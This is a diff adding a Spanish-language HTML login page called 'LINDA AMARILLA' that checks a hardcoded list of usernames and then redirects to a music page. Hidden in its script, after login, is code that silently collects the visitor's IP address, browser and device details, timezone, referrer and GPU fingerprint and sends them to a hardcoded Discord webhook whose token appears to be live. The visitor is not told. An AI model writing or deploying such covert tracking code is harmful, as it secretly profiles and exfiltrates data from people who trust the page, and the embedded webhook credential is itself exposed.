@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Login</title>
+  <style>
+    body { font-family: monospace; background: #111; color: rgb(255, 255, 255); padding: 20px; }
+    h1 { color: white; font-size: 50px; }
+    label { font-size: 40px; }
+    #loginBox { margin-top: 20px; }
+    span { color:yellow; }
+  </style>
+</head>
+<body>
+    <center>
+        <h1>LOGIN <span>LINDA AMARILLA</span></h1>
+
+        <div id="loginBox">
+            <label>Usuario:</label>
+            <input type="text" id="usernameInput" placeholder="Usuario">
+            <button onclick="startSession()">Entrar</button>
+        </div>
+    </center>
+  <script>
+    const usuariosPermitidos = ["ALE", "JERE", "NACHO", "JUAN", "TOMI", "ANDRES", "BRANDON"];
+    let usuario = "";
+
+    function startSession() {
+      const input = document.getElementById("usernameInput").value.trim();
+      if (usuariosPermitidos.includes(input)) {
+        usuario = input;
+        document.getElementById("loginBox").style.display = "none";
+        gatherData(); // Sin restricción, se puede enviar siempre
+        window.location.href = "musica.html";
+      } else {
+        alert("Usuario no válido.");
+      }
+    }
+
+    async function gatherData() {
+      const output = {};
+      output.usuario = usuario;
+      output.timestamp = new Date().toISOString();
+
+      try {
+        const ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json());
+        output.ip = ipData.ip;
+      } catch {
+        output.ip = 'Desconocida';
+      }
+
+      output.navigator = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        cookieEnabled: navigator.cookieEnabled,
+        hardwareConcurrency: navigator.hardwareConcurrency,
+        deviceMemory: navigator.deviceMemory || "No disponible",
+        vendor: navigator.vendor
+      };
+
+      output.screen = {
+        width: screen.width,
+        height: screen.height,
+        colorDepth: screen.colorDepth,
+        pixelRatio: window.devicePixelRatio
+      };
+
+      output.timezone = {
+        name: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        offsetMinutes: new Date().getTimezoneOffset()
+      };
+
+      output.referrer = document.referrer;
+
+      try {
+        const canvas = document.createElement("canvas");
+        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+        if (gl) {
+          const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+          if (debugInfo) {
+            output.gpu = {
+              vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+              renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+            };
+          }
+        }
+      } catch {
+        output.gpu = "No disponible";
+      }
+
+      output.tabActive = !document.hidden;
+
+      sendToWebhook(output);
+    }
+
+    function sendToWebhook(data) {
+      const webhookURL = 'https://discord.com/api/webhooks/1367713919405391922/SrrIrW5Rj8C6fKSZl7tFMzkVx0662jlN5o-EpvPNFXqGo91h2yzOPiOvH8-UNmQpJlyk'; // ← Cambia esto por tu webhook real
+
+      const formatted = Object.entries(data).map(([key, val]) => {
+        return `${key}: ${typeof val === 'object' ? JSON.stringify(val) : val}`;
+      }).join('\n');
+
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: `📡 Datos recopilados (educativo):\n\n${formatted}` })
+      });
+    }
+  </script>
+</body>
+</html>
